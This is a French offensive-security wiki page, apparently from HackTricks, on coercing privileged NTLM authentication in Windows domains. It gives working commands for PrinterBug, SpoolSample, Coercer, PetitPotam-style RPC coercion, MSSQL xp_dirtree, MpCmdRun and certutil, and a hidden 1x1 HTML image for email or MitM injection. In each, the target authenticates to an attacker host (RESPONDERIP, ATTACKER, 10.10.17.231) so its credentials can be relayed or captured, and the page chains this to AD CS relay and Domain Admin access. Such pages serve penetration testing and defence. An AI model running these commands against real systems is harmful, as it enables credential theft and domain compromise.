# Forcer l'authentification privilégiée NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) est une **collection** de **déclencheurs d'authentification à distance** codés en C# à l'aide du compilateur MIDL afin d'éviter les dépendances tierces.

## Abus du service Spooler

Si le service _**Print Spooler**_ est **activé,** vous pouvez utiliser certains identifiants AD déjà connus pour **demander** au serveur d'impression du Domain Controller une **mise à jour** concernant les nouveaux travaux d'impression, puis lui indiquer d'**envoyer la notification à un système** donné.\
Notez que lorsqu'une imprimante envoie la notification à des systèmes arbitraires, elle doit s'**authentifier auprès de** ce **système**. Par conséquent, un attaquant peut forcer le service _**Print Spooler**_ à s'authentifier auprès d'un système arbitraire, et le service **utilisera le compte ordinateur** lors de cette authentification.

En interne, la primitive classique **PrinterBug** abuse de **`RpcRemoteFindFirstPrinterChangeNotificationEx`** via **`\\PIPE\\spoolss`**. L'attaquant ouvre d'abord un handle vers une imprimante ou un serveur, puis fournit un faux nom de client dans `pszLocalMachine`, afin que le spooler cible crée un canal de notification **vers l'hôte contrôlé par l'attaquant**. C'est pourquoi l'effet est une **coercition de l'authentification sortante** plutôt qu'une exécution directe de code.<sup>[[2]](#references)</sup>\
Si vous recherchez une **RCE/LPE** dans le spooler lui-même, consultez [PrintNightmare](printnightmare.md). Cette page se concentre sur la **coercition et le relay**.

### Trouver les serveurs Windows du domaine

À l'aide de PowerShell, obtenez une liste des machines Windows. Les serveurs sont généralement prioritaires, alors concentrons-nous sur eux :
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Recherche des services Spooler en écoute

À l’aide d’une version légèrement modifiée de [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), vérifiez si le Spooler Service est en écoute :
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Vous pouvez également utiliser `rpcdump.py` sous Linux et rechercher le protocole **MS-RPRN** :
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ou testez rapidement les hôtes depuis Linux avec **NetExec/CrackMapExec** :
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Si vous souhaitez **énumérer les surfaces de coercition** plutôt que de simplement vérifier si l’endpoint du spooler existe, utilisez le **mode scan de Coercer** :<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Ceci est utile, car voir l’endpoint dans EPM vous indique uniquement que l’interface RPC d’impression est enregistrée. Cela **ne garantit pas** que chaque méthode de coercion soit accessible avec vos privilèges actuels ni que l’hôte émette un flux d’authentification exploitable.

### Demander au service de s’authentifier auprès d’un hôte arbitraire

Vous pouvez compiler [SpoolSample depuis ici](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou utilisez [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si vous êtes sous Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Avec **Coercer**, vous pouvez cibler directement les interfaces du spooler et éviter de deviner quelle méthode RPC est exposée :<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Forcer HTTP au lieu de SMB avec WebClient

Le PrinterBug classique produit généralement une authentification **SMB** vers `\\attacker\share`, ce qui reste utile pour le **capture**, le **relay vers des cibles HTTP** ou le **relay lorsque la signature SMB est absente**.\
Cependant, dans les environnements modernes, le **relay de SMB vers SMB** est fréquemment bloqué par la **signature SMB** ; les opérateurs préfèrent donc souvent forcer une authentification **HTTP/WebDAV** à la place.

Si le service **WebClient** est actif sur la cible, le listener peut être spécifié sous une forme qui pousse Windows à utiliser **WebDAV via HTTP** :
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Cela est particulièrement utile lors du chaining avec **`ntlmrelayx --adcs`** ou d'autres cibles de relay HTTP, car cela évite de dépendre de la relayabilité SMB sur la connexion forcée. Le point important est que **WebClient doit être en cours d'exécution** sur la victime pour que la variante HTTP/WebDAV fonctionne.

### Combinaison avec Unconstrained Delegation

Si un attaquant a déjà compromis un ordinateur avec [Unconstrained Delegation](unconstrained-delegation.md), il pourrait **forcer l'imprimante à s'authentifier auprès de cet ordinateur**. En raison de l'Unconstrained Delegation, le **TGT** du **compte ordinateur de l'imprimante** sera **enregistré dans la** **mémoire** de l'ordinateur avec Unconstrained Delegation. Comme l'attaquant a déjà compromis cet hôte, il pourra **récupérer ce ticket** et l'exploiter ([Pass the Ticket](pass-the-ticket.md)).

## Authentification forcée RPC

[Coercer](https://github.com/p0dalirius/Coercer)

### Matrice de coercition RPC par chemin UNC (interfaces/opnums qui déclenchent une authentification sortante)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: interface d'impression asynchrone sur le même pipe spooler ; utiliser Coercer pour énumérer les méthodes accessibles sur un hôte donné<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (également via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums couramment exploités: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Remarque : ces méthodes acceptent des paramètres pouvant contenir un chemin UNC (par exemple, `\\attacker\share`). Lors du traitement, Windows s'authentifiera (dans le contexte de la machine ou de l'utilisateur) auprès de cet UNC, ce qui permet la capture ou le relay de NetNTLM.\
Pour l'exploitation du spooler, **l'opnum 65 de MS-RPRN** reste la primitive la plus courante et la mieux documentée, car la spécification du protocole indique explicitement que le serveur crée un canal de notification vers le client spécifié par `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: coercition ElfrOpenBELW (opnum 9)
- Interface: MS-EVEN via \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: la cible tente d'ouvrir le chemin du journal de sauvegarde fourni et s'authentifie auprès de l'UNC contrôlé par l'attaquant.<sup>[[1]](#references)</sup>
- Practical use: forcer des ressources Tier 0 (DC/RODC/Citrix/etc.) à émettre du NetNTLM, puis effectuer un relay vers des endpoints AD CS (scénarios ESC8/ESC11) ou d'autres services privilégiés.<sup>[[1]](#references)</sup>

## PrivExchange

L'attaque `PrivExchange` résulte d'une faille présente dans la **fonctionnalité `PushSubscription` d'**Exchange Server. Cette fonctionnalité permet à n'importe quel utilisateur du domaine disposant d'une mailbox de forcer le serveur Exchange à s'authentifier auprès d'un hôte fourni par le client via HTTP.

Par défaut, le **service Exchange s'exécute en tant que SYSTEM** et dispose de privilèges excessifs (notamment de **privilèges WriteDacl sur le domaine avant la Cumulative Update 2019**). Cette faille peut être exploitée pour permettre le **relay d'informations vers LDAP, puis extraire la base de données NTDS du domaine**. Lorsque le relay vers LDAP n'est pas possible, cette faille peut toujours être utilisée pour effectuer un relay et s'authentifier auprès d'autres hôtes du domaine. L'exploitation réussie de cette attaque accorde un accès immédiat à l'utilisateur Domain Admin avec n'importe quel compte utilisateur authentifié du domaine.

## Dans Windows

Si vous êtes déjà à l'intérieur de la machine Windows, vous pouvez forcer Windows à se connecter à un serveur en utilisant des comptes privilégiés avec :

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ou utilisez cette autre technique : [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Il est possible d’utiliser le lolbin certutil.exe (binaire signé par Microsoft) pour forcer une authentification NTLM :
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Injection HTML

### Via email

Si vous connaissez l’**adresse email** de l’utilisateur qui se connecte à une machine que vous souhaitez compromettre, vous pouvez simplement lui envoyer un **email contenant une image de 1x1 pixel**, par exemple
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
et lorsqu’il l’ouvrira, il tentera de s’authentifier.

### MitM

Si vous pouvez effectuer une attaque MitM contre un ordinateur et injecter du HTML dans une page qu’il visualisera, vous pourriez essayer d’injecter une image comme celle présentée ci-dessous dans la page :
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Autres moyens de forcer et de phisher l'authentification NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Si vous pouvez capturer des challenges [NTLMv1, lisez ici comment les cracker](../ntlm/index.html#ntlmv1-attack).\
_N'oubliez pas que, pour cracker NTLMv1, vous devez définir le challenge de Responder sur « 1122334455667788 »_

## Références

- [1] [Unit 42 – La coercition d'authentification continue d'évoluer](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN : RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN : EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN : ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
